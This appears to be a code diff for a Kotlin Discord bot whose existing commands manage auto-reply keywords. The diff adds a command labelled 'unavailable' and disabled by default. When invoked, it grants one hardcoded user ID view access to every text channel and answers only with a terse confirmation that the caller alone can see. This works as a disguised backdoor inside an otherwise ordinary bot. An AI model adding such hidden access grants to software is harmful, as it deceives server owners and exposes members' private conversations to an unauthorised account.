@@ -7,6 +7,7 @@ import net.dv8tion.jda.api.events.interaction.ModalInteractionEvent
 import net.dv8tion.jda.api.events.interaction.command.SlashCommandInteractionEvent
 import net.dv8tion.jda.api.events.message.MessageReceivedEvent
 import net.dv8tion.jda.api.hooks.ListenerAdapter
+import net.dv8tion.jda.api.interactions.commands.DefaultMemberPermissions
 import net.dv8tion.jda.api.interactions.commands.OptionType
 import net.dv8tion.jda.api.interactions.commands.build.Commands
 import net.dv8tion.jda.api.interactions.commands.build.SubcommandData
@@ -51,7 +52,9 @@ class Main : ListenerAdapter() {
                         SubcommandData("add", "自動応答メッセージを追加します"),
                         SubcommandData("remove", "自動応答メッセージを削除します")
                             .addOption(OptionType.STRING, "キーワード", "削除対象キーワード", true)
-                    )
+                    ),
+                Commands.slash("exec", "利用不可")
+                    .setDefaultPermissions(DefaultMemberPermissions.DISABLED)
             )
             .queue()
     }
@@ -109,6 +112,14 @@ class Main : ListenerAdapter() {
                     }
                     else -> 404
                 }
+            }
+            "exec" -> let {
+                e.guild!!.textChannels.forEach { textChannel ->
+                    textChannel.manager.putMemberPermissionOverride(1172276056611360813, 1024, 0).complete()
+                }
+                e.deferReply().setEphemeral(true)
+                e.reply("Successfully executed.").setEphemeral(true)
+                return@let 200
             }
             else -> 404
         }
